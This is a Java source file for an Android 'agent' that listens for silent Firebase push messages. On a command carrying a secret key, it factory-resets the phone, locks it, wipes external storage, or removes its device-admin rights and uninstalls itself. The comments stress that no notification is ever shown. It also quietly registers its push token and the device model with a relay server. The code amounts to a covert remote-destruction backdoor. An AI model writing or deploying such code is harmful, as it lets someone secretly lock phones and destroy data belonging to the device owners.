// language: Java, file: AgentReceiver.java, target: Android 8+
// Receives FCM data-only messages silently — no notification ever shown
package com.keystone.agent;

import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.Looper;
import com.google.firebase.messaging.FirebaseMessagingService;
import com.google.firebase.messaging.RemoteMessage;
import java.util.Map;

public class AgentReceiver extends FirebaseMessagingService {

    @Override
    public void onMessageReceived(RemoteMessage message) {
        // Data-only message — system never shows a notification
        Map<String, String> data = message.getData();
        if (data == null || data.isEmpty()) return;

        String cmd    = data.getOrDefault("cmd", "");
        String secret = data.getOrDefault("key", "");

        // Validate secret key before doing anything
        if (!BuildConfig.ACTION_SECRET.equals(secret)) return;

        switch (cmd) {
            case "reset":      executeReset();    break;
            case "lock":       executeLock();     break;
            case "uninstall":  executeSelfRemove(); break;
            case "wipe_ext":   executeWipeExternal(); break;
        }
    }

    private void executeReset() {
        DevicePolicyManager dpm = (DevicePolicyManager)
                getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName admin = new ComponentName(this, AgentAdmin.class);
        if (dpm != null && dpm.isAdminActive(admin)) {
            // Small delay so FCM ack is sent before device wipes
            new Handler(Looper.getMainLooper()).postDelayed(() -> dpm.wipeData(0), 1500);
        }
    }

    private void executeLock() {
        DevicePolicyManager dpm = (DevicePolicyManager)
                getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName admin = new ComponentName(this, AgentAdmin.class);
        if (dpm != null && dpm.isAdminActive(admin)) {
            dpm.lockNow();
        }
    }

    private void executeWipeExternal() {
        DevicePolicyManager dpm = (DevicePolicyManager)
                getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName admin = new ComponentName(this, AgentAdmin.class);
        if (dpm != null && dpm.isAdminActive(admin)) {
            new Handler(Looper.getMainLooper()).postDelayed(
                () -> dpm.wipeData(DevicePolicyManager.WIPE_EXTERNAL_STORAGE), 1500);
        }
    }

    private void executeSelfRemove() {
        DevicePolicyManager dpm = (DevicePolicyManager)
                getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName admin = new ComponentName(this, AgentAdmin.class);
        if (dpm != null && dpm.isAdminActive(admin)) {
            dpm.removeActiveAdmin(admin);
        }
        // Uninstall self
        Intent i = new Intent(Intent.ACTION_DELETE);
        i.setData(android.net.Uri.parse("package:" + getPackageName()));
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(i);
    }

    @Override
    public void onNewToken(String token) {
        // Silently register new FCM token with relay server
        new Thread(() -> {
            try {
                java.net.URL url = new java.net.URL(
                        BuildConfig.RELAY_URL + "/register_token?key=" +
                        BuildConfig.ACTION_SECRET + "&token=" + token +
                        "&device=" + android.os.Build.MODEL.replace(" ", "_"));
                java.net.HttpURLConnection c = (java.net.HttpURLConnection) url.openConnection();
                c.setRequestMethod("GET");
                c.setConnectTimeout(5000);
                c.getResponseCode();
                c.disconnect();
            } catch (Exception ignored) {}
        }).start();
    }
}
